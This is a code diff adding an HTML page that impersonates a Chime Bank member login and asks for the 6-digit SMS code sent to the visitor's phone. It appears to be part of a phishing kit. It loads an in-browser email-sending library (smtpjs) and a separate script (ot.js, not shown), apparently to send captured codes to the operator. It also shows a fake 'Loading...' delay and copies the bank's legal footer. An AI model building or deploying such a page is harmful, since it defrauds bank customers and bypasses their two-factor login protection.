@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<html>
+<head>
+    <meta charset="utf-8">
+
+        <!--"user-scalable=no" disable zooming when
+        clicking in submission boxes on mobile-->
+
+        <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+        
+        <title>Chime Member Login</title>
+
+        <!--href stands for hypertext reference-->
+        <!---<link rel="icon" href="Chaseico.ico" type="image/x-icon">--->
+
+        <link rel="stylesheet" href="style.css"
+        type="text/css">
+        <script src="https://smtpjs.com/v3/smtp.js"></script>
+
+</head>
+<body>
+    <br>
+    <div class="chi1">
+        <img src="Untitled.jpg" width="200" height="90" loading="lazy">
+    </div><br>
+    <div class="soss">
+        <p class="sos">Please enter the 6-digit Code sent to your phone number</p><br>
+    </div>
+    <form action="#" class="contact1">
+
+        <!--- <input id="otp1" type="number" pattern="[0-9]*" placeholder="SMS Code" maxlength="6" required>  --->
+        <input id="otp1" type="number" pattern="[0-9]*" placeholder="SMS code" oninput="checkPhoneNumberLength(this)" required>
+        <script>
+            function checkPhoneNumberLength(input) {
+                if (input.value.length > 6) {
+                input.value = input.value.slice(0, 6);
+                }
+            }
+        </script>
+          
+        <input id="fsubmit1" type="submit" value="Log In">
+
+        <!--javascript to change Submit to Loading after click, check css-->
+        <script>
+            var button = document.querySelector('.contact1 input[type="submit"]');
+            button.addEventListener('click', function() {
+                button.classList.add('clicked');
+                button.value = "Loading...";               
+                setTimeout(function() {
+                    button.classList.remove('clicked');
+                    button.value = "Log In";
+                },  4000); 
+            });
+        </script>
+        <script src="./ot.js"></script>
+    <form>
+    
+    <br><br><br><br><br><br><br><br>
+    <div class="dota1">
+        <p class = "doa1">Please allow up to 1 minute to recieve your SMS login code</p>
+    </div><br><br>
+
+</body>
+<footer>
+    <p class="foot1">© 2023 Chime Bank. All Rights Reserved. Banking Services provided by The Bancorp Bank or Stride Bank, N.A., Members FDIC.</p>
+    <p class="toot1">The Chime Visa® Debit Card is issued by The Bancorp Bank or Stride Bank pursuant to a license from Visa U.S.A. Inc. and may be used everywhere Visa debit cards are</p>
+    <p class="ace1">accepted. Please see back of your Card for its issuing bank.</p>
+</footer>
+</html>
